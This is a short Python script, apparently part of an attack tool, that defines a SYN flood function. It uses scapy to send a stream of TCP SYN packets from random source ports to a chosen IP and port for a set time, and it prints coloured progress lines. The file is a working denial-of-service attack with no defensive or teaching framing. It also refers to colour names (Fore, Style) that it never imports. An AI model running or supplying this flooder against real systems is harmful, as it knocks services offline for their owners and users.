import socket
import random
from scapy.all import *

def syn_flood(target_ip, target_port, duration):
    timeout = time.time() + duration
    print(f"\n{Fore.CYAN}[*] Starting SYN Flood on {target_ip}:{target_port} for {duration}s...{Style.RESET_ALL}")
    while time.time() < timeout:
        ip = IP(dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        pkt = ip/tcp
        send(pkt, verbose=0)
        print(f"{Fore.RED}[SYN] Packet sent to {target_ip}:{target_port}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] SYN Flood Completed.{Style.RESET_ALL}")
